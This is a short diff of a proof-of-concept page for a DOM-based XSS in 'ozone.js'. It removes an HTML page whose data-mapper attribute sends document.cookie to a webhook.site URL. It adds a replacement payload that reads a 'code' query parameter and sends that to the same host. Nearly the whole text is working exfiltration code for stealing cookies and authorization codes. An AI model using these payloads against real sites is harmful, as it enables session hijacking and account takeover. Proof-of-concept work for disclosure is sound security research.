@@ -1,15 +1,4 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>PoC DOM XSS - ozone.js</title>
-    <meta charset="UTF-8" />
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="ozone.js"></script>
-  </head>
-  <body>
-    <select
-      data-src-url="/api/data"
-      data-mapper="()=>{fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc?cookie=' + document.cookie)}">
-    </select>
-  </body>
-</html>
+data-mapper="()=>{
+  const code = new URLSearchParams(location.search).get('code');
+  fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc?code=' + code);
+}"
